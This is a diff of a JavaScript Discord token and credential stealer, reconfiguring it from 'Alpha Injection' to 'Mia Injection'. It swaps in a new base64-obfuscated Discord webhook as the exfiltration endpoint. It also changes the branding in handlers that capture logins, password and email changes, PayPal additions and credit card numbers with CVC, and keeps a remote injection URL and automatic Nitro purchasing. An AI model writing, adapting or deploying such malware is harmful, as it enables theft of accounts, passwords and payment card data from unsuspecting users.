@@ -4,7 +4,7 @@ const path = require('path');
 const https = require('https');
 const querystring = require('querystring');
 const Buffer = require('buffer').Buffer
-const hook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTExOTQ0Njg1MTEwMDM0NDM2MC92cUhIQWRacEZWMVRrZDF3aldqeDY3OGcwMVRQMVNGYjY2NjFoS2pPS3kyM2ltYW9HX2RDdHNWSXFrSHJNN2ctUjl1Zg=='
+const hook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTEyMjcxMDA2ODgzMjUwMTc4MC9fQ2JOREU2WVRLN0t5VWdiY3pLdERQUUxnNjJqSjBqS25aMVF4X3lzTDIzcldnRjc1WUFNazBNdm1zNUR2MmNielZDYw=='
 
 const config = {
   webhook: Buffer.from(hook, 'base64').toString('ascii'),
@@ -12,8 +12,8 @@ const config = {
   auto_buy_nitro: true, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Alpha Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1063159728550711296/1115035236120670319/alpha.png'.replace(/ /g, '%20'), 
+  embed_name: 'Mia Injection', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1120085620316975166/1122704905409417316/download.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/requeste/injection/main/index.js', 
   /**
@@ -684,8 +684,8 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'Alpha Injection',
-            icon_url: "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif"
+            text: 'Mia Injection',
+            icon_url: "https://cdn.discordapp.com/attachments/1120085620316975166/1122704905409417316/download.jpg"
         },
       },
     ],
@@ -727,8 +727,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'Alpha Injection',
-            icon_url: "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif"
+            text: 'Mia Injection',
+            icon_url: "https://cdn.discordapp.com/attachments/1120085620316975166/1122704905409417316/download.jpg"
         },
       },
     ],
@@ -770,8 +770,8 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'Alpha Injection',
-            icon_url: "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif"
+            text: 'Mia Injection',
+            icon_url: "https://cdn.discordapp.com/attachments/1120085620316975166/1122704905409417316/download.jpg"
         },
       },
     ],
@@ -813,8 +813,8 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'Alpha Injection',
-            icon_url: "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif"
+            text: 'Mia Injection',
+            icon_url: "https://cdn.discordapp.com/attachments/1120085620316975166/1122704905409417316/download.jpg"
         },
       },
     ],
@@ -856,8 +856,8 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'Alpha Injection',
-            icon_url: "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif"
+            text: 'Mia Injection',
+            icon_url: "https://cdn.discordapp.com/attachments/1120085620316975166/1122704905409417316/download.jpg"
         },
       },
     ],
@@ -901,8 +901,8 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'Alpha Injection',
-            icon_url: "https://cdn.discordapp.com/attachments/1068665758755860571/1068919202041311342/GIF-210621_214354.gif"
+            text: 'Mia Injection',
+            icon_url: "https://cdn.discordapp.com/attachments/1120085620316975166/1122704905409417316/download.jpg"
         },
       },
     ],
